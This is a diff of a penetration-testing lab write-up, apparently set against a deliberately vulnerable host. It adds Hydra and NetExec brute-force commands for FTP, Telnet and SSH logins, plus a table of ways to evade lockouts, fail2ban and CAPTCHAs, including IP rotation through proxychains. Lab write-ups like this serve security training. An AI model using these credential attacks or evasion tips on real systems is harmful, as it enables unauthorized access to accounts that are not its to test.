@@ -98,19 +98,43 @@ echo -e "1234\nadmin\npassword\msfadmin" > passlist.txt
 ```bash
 hydra -L userlist.txt -P passlist.txt <TARGET_IP> ftp -V
 ```
-*Successful login screenshot here.*
+- `-L`: path to username list
+- `-P`: path to password list
+- `-V`: verbose (shows attempts)
+- `ftp://<TARGET_IP>`: target service
 
-### 🔹3.2 TELNET Brute Force Attack (Medusa)
+![alt text](image-16.png)
+
+### 🔹3.2 TELNET Brute Force Attack (Hydra)
 ```bash
-medusa -h <TARGET_IP> -U userlist.txt -P passlist.txt -M telnet
+hydra -L userlist.txt -P passlist.txt <TARGET_IP> telnet -V
 ```
-*Successful login screenshot here.*
+- **`-L userlist.txt`**: Path to username list
+- **`-P passlist.txt`**: Path to password list
+- **`telnet://<TARGET_IP>`**: Target Telnet service
+- **`-V`**: Verbose mode (shows attempts)
+
+![alt text](image-17.png)
 
 ### 🔹3.3 SSH Brute Force Attack (NetExec)
+NetExec (formerly CrackMapExec) is great for SSH:
 ```bash
-nxc <TARGET_IP> -u userlist.txt -p passlist.txt -m ssh
+nxc ssh <TARGET_IP> -u userlist.txt -p passlist.txt
 ```
-*Successful login screenshot here.*
+- `-u`: Path to username list
+- `-p`: Path to password list
+- `-m ssh`: Specifies SSH as the target service
+
+
+If you want to use Hydra instead:
+```bash
+hydra -L userlist.txt -P passlist.txt ssh://<TARGET_IP>
+```
+- `-L`: Path to username list
+- `-P`: Path to password list
+- `ssh://<TARGET_IP>`: Target SSH service
+
+🧠 SSH often has brute force protection — space out requests or use a proxy if needed.
 
 ### 🔹3.4 HTTP Login Brute Force Attack (Burp Suite)
 1. Start **Burp Suite** → Set your browser to use Burp as a proxy.
@@ -128,6 +152,14 @@ nxc <TARGET_IP> -u userlist.txt -p passlist.txt -m ssh
    - Success indicators (e.g., “Welcome” or redirect)
 
 *Provide screenshot of a successful login attempt.*
+
+### ⚠️ Common Issues & Fixes
+
+| Problem | Cause | Fix |
+|--------|-------|-----|
+| Too many failed attempts | Account lockout / rate-limiting | Add delay or reduce threads (`-t 1`) |
+| CAPTCHA or login form protections | HTTP brute force fails | May need manual testing or bypass techniques |
+| SSH protection (fail2ban) | IP gets banned | Rotate IPs (proxychains or VPN) |
 
 ## 4. Sniffing Network Traffic
 ### Capturing Packets using Wireshark
